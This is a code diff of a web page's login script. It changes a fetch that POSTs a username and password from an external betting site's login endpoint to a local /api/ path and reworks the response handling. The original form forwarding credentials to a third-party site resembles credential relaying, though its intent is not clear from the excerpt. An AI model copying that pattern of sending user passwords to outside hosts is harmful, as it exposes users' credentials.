@@ -1017,23 +1017,22 @@ function sendEmail(formData) {
               password: password
           };
   
-          fetch('https://wager.bitcoinbay.ag/redirectlogin.php', {
+          fetch('/api/redirectlogin.php', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/x-www-form-urlencoded'
               },
               body: new URLSearchParams(payload)
           })
-          .then(response => response.text())
-          .then(text => {
-              console.log('Raw response:', text);
-              let data;
-              try {
-                  data = JSON.parse(text);
-              } catch (error) {
-                  console.error('Response is not valid JSON:', text);
-                  throw error;
+          .then(response => {
+              if (response.ok) {
+                  // Handle successful response
+                  return response.json();
+              } else {
+                  throw new Error('Network response was not ok.');
               }
+          })
+          .then(data => {
               if (data.success) {
                   console.log('Login successful');
                   // Redirect or handle success
@@ -1049,6 +1048,7 @@ function sendEmail(formData) {
       });
   });
 </script>
+
 
 
 
